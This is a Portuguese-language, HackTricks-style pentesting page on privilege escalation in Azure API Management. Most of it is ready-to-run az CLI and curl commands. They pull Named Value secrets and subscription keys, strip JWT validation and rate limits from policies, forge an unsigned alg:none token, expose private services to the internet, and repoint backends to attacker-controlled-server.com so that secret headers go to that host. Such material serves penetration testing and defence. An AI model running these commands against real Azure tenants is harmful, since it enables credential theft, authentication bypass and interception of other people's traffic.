# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

O ataque consiste em acessar segredos sensíveis armazenados em Azure API Management Named Values, seja recuperando diretamente os valores secretos ou abusando de permissões para obter segredos protegidos por Key Vault através de managed identities.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Para cada subscription, o atacante pode obter as subscription keys usando o endpoint listSecrets com o método POST:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
A resposta inclui a chave primária da assinatura (primaryKey) e a chave secundária (secondaryKey). Com essas chaves, o atacante pode autenticar e acessar as APIs publicadas através do API Management Gateway:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
O atacante pode acessar todas as APIs e produtos associados à assinatura. Se a assinatura tiver acesso a produtos ou APIs sensíveis, o atacante pode obter informações confidenciais ou executar operações não autorizadas.

## `Microsoft.ApiManagement/service/policies/write` ou `Microsoft.ApiManagement/service/apis/policies/write`

O atacante primeiro recupera a política atual da API:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
O atacante pode modificar a política de várias formas dependendo de seus objetivos. Por exemplo, para desabilitar a autenticação, se a política incluir JWT token validation, o atacante pode remover ou comentar essa seção:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Para remover os controles de rate limiting e permitir ataques de denial-of-service, o atacante pode remover ou comentar políticas de quota e rate-limit:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Para modificar a rota do backend e redirecionar o tráfego para um servidor controlado pelo atacante:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
O atacante então aplica a policy modificada. O corpo da requisição deve ser um objeto JSON contendo a policy em formato XML:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## Misconfiguração na Validação de JWT

O atacante precisa saber que uma API usa validação de tokens JWT e que a política está mal configurada. Políticas de validação de JWT mal configuradas podem ter `require-signed-tokens="false"` ou `require-expiration-time="false"`, o que permite que o serviço aceite tokens não assinados ou tokens que nunca expiram.

O atacante cria um token JWT malicioso usando o algoritmo none (unsigned):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
O atacante envia uma requisição para a API usando o token malicioso:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Se a política estiver mal configurada com `require-signed-tokens="false"`, o serviço aceitará o token não assinado. O atacante também pode criar um token sem uma claim de expiração se `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
O atacante primeiro verifica a configuração de rede atual do serviço:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
O atacante analisa a resposta JSON para verificar os valores de `publicNetworkAccess` e `virtualNetworkType`. Se `publicNetworkAccess` estiver definido como false ou `virtualNetworkType` estiver definido como Internal, o serviço está configurado para acesso privado.

Para expor o serviço à Internet, o atacante deve alterar ambas as configurações. Se o serviço estiver em modo Internal (`virtualNetworkType: "Internal"`), o atacante altera para None ou External e habilita `publicNetworkAccess`. Isso pode ser feito usando a Azure Management API:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Uma vez que `virtualNetworkType` esteja definido como `None` ou `External` e `publicNetworkAccess` esteja habilitado, o serviço e todas as suas APIs tornam-se acessíveis pela Internet, mesmo que anteriormente estivessem protegidos por uma rede privada ou endpoints privados.

## `Microsoft.ApiManagement/service/backends/write`
O atacante primeiro enumera os backends existentes para identificar qual modificar:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
O atacante obtém a configuração atual do backend que deseja modificar:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
O atacante modifica o backend URL para apontar para um servidor sob seu controle. Primeiro, ele obtém o ETag da resposta anterior e então atualiza o backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Alternativamente, o atacante pode configurar cabeçalhos do backend para exfiltrar Named Values que contenham segredos. Isso é feito através da configuração de backend credentials:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Com esta configuração, Named Values são enviados como headers em todas as requests para o backend controlado pelo atacante, permitindo a exfiltração de segredos sensíveis.

{{#include ../../../banners/hacktricks-training.md}}
